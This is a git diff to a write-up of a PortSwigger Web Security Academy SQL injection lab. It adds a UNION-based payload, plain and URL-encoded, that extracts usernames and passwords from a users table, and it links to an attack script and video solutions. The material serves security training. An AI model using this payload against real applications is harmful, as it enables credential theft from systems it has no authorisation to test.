@@ -19,9 +19,9 @@ You can find some useful payloads on our [SQL injection cheat sheet](https://por
 > Scripting the attack: [Script](https://github.com/darshannn10/PortSwiggers-Web-Sec-Academy/blob/main/SQL-Injection/Lab-06/sqli-lab-06.py)
 
 ## Payload:
-Normal: 
+Normal: ``'  UNION SELECT NULL,username ||':'|| password FROM users--```
 
-URL-Encoded:
+URL-Encoded: ```%27+UNION+SELECT+NULL,username||%27:%27||password+FROM+users--```
 
 ## Video Solution:
 1. [Manual](https://youtu.be/yRVYoqR9vrI)
